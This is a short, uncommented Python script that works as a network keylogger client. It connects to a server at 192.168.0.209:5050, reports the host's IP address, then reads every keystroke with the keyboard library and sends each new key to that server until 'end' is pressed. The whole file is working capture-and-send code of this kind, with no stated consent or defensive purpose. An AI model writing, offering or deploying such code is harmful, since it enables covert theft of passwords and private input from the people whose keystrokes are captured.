import socket
import sys
import keyboard
import time

HEADER = 64
FORMAT = 'utf-8'
PORT = 5050
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "192.168.0.209"
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_lenght = len(message)
    send_length = str(msg_lenght).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

send(f"[USER {socket.gethostbyname(socket.gethostname())}]Conected")#sys.argv[1]


message_prev = ""
while True:
    message = keyboard.read_key()
    if message == "end":
        send(DISCONNECT_MESSAGE)
        break
    if message_prev != message:
        send(message)
        message_prev = message
    